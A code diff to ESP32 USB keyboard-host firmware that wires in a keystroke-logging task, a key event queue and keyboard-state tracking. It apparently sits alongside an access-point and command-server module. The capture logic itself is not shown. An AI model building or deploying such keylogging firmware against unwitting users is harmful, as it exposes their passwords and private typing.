@@ -24,6 +24,9 @@
 #include "ap.h"
 #include "command_server.h"
 #include "hid_usb_lib_task.h"
+#include "keyboard_info.h"
+#include "key_queue.h"
+#include "key_logging_task.h"
 
 /* GPIO Pin number for quit from example logic */
 #define APP_QUIT_PIN                GPIO_NUM_0
@@ -165,7 +168,9 @@ void app_main(void)
     }
 
 
-
+    // Initialize keyboard info semaphore and key event queue
+    ESP_ERROR_CHECK(keyboard_info_init());
+    ESP_ERROR_CHECK(key_queue_init());
 
 
     /*
@@ -177,11 +182,25 @@ void app_main(void)
                                            "usb_events",
                                            4096,
                                            xTaskGetCurrentTaskHandle(),
-                                           2, NULL, 0);
+                                           6, NULL, 0);
     assert(task_created == pdTRUE);
 
     // Wait for notification from usb_lib_task to proceed
     ulTaskNotifyTake(false, 1000);
+
+    BaseType_t created_keylogging_task = xTaskCreate(
+            key_logging_task,
+            "key_logger",
+            4096,
+            NULL,
+            2,
+            NULL
+    );
+
+    if (created_keylogging_task != pdTRUE) {
+        ESP_LOGE("main", "Could not create keylogging task");
+        return;
+    }
 
     /*
     * HID host driver configuration
